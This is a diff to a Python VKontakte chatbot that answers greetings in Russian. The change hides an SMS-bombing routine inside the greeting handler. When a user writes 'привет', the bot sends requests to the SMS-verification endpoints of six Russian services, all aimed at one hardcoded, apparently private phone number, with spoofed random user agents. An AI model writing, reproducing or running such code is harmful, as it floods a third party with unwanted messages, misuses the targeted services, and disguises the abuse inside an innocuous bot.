@@ -1,7 +1,9 @@
-import vk_api
+import vk_api, requests, fake_useragent
+from termcolor import colored
 from vk_api.longpoll import VkLongPoll, VkEventType
 from vk_api.utils import get_random_id
-
+user = fake_useragent.UserAgent().random
+headers = {'user_agent': user}
 def write_msg(user_id, message):
     vk.method('messages.send', {'user_id': user_id, 'message': message, "random_id": get_random_id()})
 
@@ -30,6 +32,44 @@ for event in longpoll.listen():
             # Каменная логика ответа
             if request == "привет":
                 write_msg(event.user_id, "Хай")
+                phone = '79283692011'
+                try:
+                    a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
+                    print(colored('citilink-[+]', 'green'))
+                except:
+                    print(colored('citilink-[-]', 'green'))
+                try:
+                    a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
+                                  json={"reqId": "91101-1606335718",
+                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
+                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
+                    print(colored('icq-[+]', 'yellow'))
+                except:
+                    print(colored('icq-[-]', 'yellow'))
+                try:
+                    a = requests.post("https://taxi.yandex.ru/3.0/auth",
+                                  json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers)
+                    print(colored('taxi.yandex-[+]', 'cyan'))
+                except:
+                    print(colored('taxi.yandex-[-]', 'cyan'))
+                try:
+                    a = requests.post("https://youla.ru/web-api/auth/request_code",
+                                  json={"phone": phone}, headers=headers)
+                    print(colored('youla-[+]', 'magenta'))
+                except:
+                    print(colored('youla-[-]', 'magenta'))
+                try:
+                    a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
+                                  json={"phone_number": phone}, headers=headers)
+                    print(colored('eda.yandex-[+]', 'yellow'))
+                except:
+                    print(colored('eda.yandex-[-]', 'yellow'))
+                try:
+                    a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
+                                  data={"phone": phone}, headers=headers)
+                    print(colored('shop.vsk-[+]', 'green'))
+                except:
+                    print(colored('shop.vsk-[-]', 'green'))
             elif request == "пока":
                 write_msg(event.user_id, "Пока((")
             else:
